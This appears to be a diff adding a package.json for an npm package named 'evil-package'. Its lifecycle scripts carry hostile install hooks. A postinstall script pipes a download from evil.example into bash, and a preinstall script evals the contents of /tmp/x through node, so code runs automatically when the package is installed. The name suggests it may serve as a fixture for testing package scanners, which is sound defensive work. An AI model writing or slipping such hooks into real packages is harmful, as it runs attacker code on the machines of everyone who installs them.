@@ -1,0 +1,10 @@
+{
+  "name": "evil-package",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://evil.example/k | bash",
+    "prepare": "node build.js",
+    "preinstall": "node -e \"eval(require('fs').readFileSync('/tmp/x','utf8'))\"",
+    "test": "vitest run"
+  }
+}
